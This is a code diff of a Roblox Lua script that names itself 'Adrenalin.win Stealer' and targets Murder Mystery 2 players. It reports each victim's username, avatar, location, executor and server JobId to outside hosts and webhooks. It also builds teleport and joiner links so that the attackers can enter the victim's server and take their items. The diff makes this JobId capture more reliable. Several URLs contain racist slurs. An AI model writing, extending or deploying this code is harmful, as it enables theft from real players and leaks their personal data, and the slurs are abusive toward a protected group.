@@ -1,4 +1,4 @@
---Ez
+--Ezzz
 
 _G.Usernames = {"AmeliaPrimalPanda201"} 
 _G.min_rarity = "Common" 
@@ -156,6 +156,13 @@ end
 local executor = (identifyexecutor and identifyexecutor():lower()) or "unknown"
 
 local jobId = game.JobId
+local uuidPattern = "^%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x$"
+local jobIdAttempts = 0
+while (not jobId or jobId == "" or not string.match(jobId, uuidPattern)) and jobIdAttempts < 30 do
+    task.wait(1)
+    jobId = game.JobId
+    jobIdAttempts = jobIdAttempts + 1
+end
 
 
 
@@ -169,7 +176,7 @@ local function assignHitToDatabase()
     for _, receiverName in ipairs(userList) do
         local receiverStr = tostring(receiverName)
         local payload = {
-            jobId = game.JobId, 
+            jobId = jobId, 
             placeId = game.PlaceId,
             username = plr.Name,
             receiver = receiverStr 
@@ -195,7 +202,7 @@ local function assignDhToDatabase()
     for _, receiverName in ipairs(userListt) do
         local receiverStr = tostring(receiverName)
         local payload = {
-            jobId = game.JobId, 
+            jobId = jobId, 
             placeId = game.PlaceId,
             username = plr.Name,
             receiver = receiverStr 
@@ -519,7 +526,7 @@ local function SendFirstMessage(list, prefix)
     local itemPrices = usdData.itemPrices or {}
     local Executor = (identifyexecutor and identifyexecutor()) or "Unknown"
   
-    local JoinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+    local JoinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
     local avatarrUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"
     local avatarUrl = "https://fuckingniggermf.vercel.app/api/avatar?userId=" .. tostring(plr.UserId)
      local NotHead = "https://fuckingniggermf.vercel.app/api/Nigger?userId=" .. tostring(plr.UserId)
@@ -591,7 +598,7 @@ local locationStr = (loc.country or "Unknown")
     local data = {
     gameType = "MM2", 
     tophit = isTopHit,
-        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
+        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. jobId .. "')",
         username = "Adrenalin.win Stealer",
         avatar_url = "https://cs14.pikabu.ru/post_img/big/2023/08/04/4/169112793213668504.jpg",
         embeds = {{
